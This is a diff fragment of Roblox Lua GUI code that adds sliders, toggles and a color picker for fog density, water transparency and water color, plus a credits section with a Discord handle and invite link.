+            Lighting:WaitForChild('Atmosphere').Density = _G.FogEnd
+            _G.FogEndChanged = Value
+            if not FogEndChanged and _G.FogEndChanged then
+                FogEndChanged = Lighting.Changed:Connect(function(clock)
+                    if not _G.FogEndChanged then
+                        FogEndChanged:Disconnect()
+                        FogEndChanged = nil
+                    end
+                    if clock == 'Fog End' then
+                        Lighting:WaitForChild('Atmosphere').Density = _G.FogEnd
+                    end
+                end)
+            else
+                if FogEndChanged then
+                    FogEndChanged:Disconnect()
+                    FogEndChanged = nil
+                end
+            end
+        end
+	end    
+})
+
+VisualsSection:CreateSliderToggle({
+	Name = "Contrast",
+	Min = 0,
+	Max = 31,
+    Digits = 1,
+	SliderDefault = Workspace:WaitForChild('Terrain').WaterTransparency,
+    ToggleDefault = false,
+    SliderFlag = 'WaterTransparency',
+    ToggleFlag = 'ToggleWaterTransparency',
+    SliderCallback = function(Value)
+        _G.WaterTransparency = Value
+    end,
+	ToggleCallback = function(Value)
+        if _G.WaterTransparency then
+            Workspace:WaitForChild('Terrain').WaterTransparency = _G.WaterTransparency
+        end
+	end    
+})
+
+VisualsSection:CreateColorPicker({
+    Name = 'Water Color',
+    Default = Color3.fromRGB(Workspace:WaitForChild('Terrain').WaterColor.R*255, Workspace:WaitForChild('Terrain').WaterColor.G*255, Workspace:WaitForChild('Terrain').WaterColor.B*255),
+    Flag = 'WaterColor',
+    Callback = function(Value)
+        Workspace:WaitForChild('Terrain').WaterColor = (Value)
+    end
+})
+
+local BumpUpVisualsSection = Visuals:CreateSection('')
+
+local CreditSection = Credits:CreateSection('Credits')
+
+CreditSection:CreateParagraph("TheRealGamer903#7339(on discord)")
+CreditSection:CreateParagraph("Join the discord! [https://discord.gg/Hh5gUpcUpd]")
+
+
+
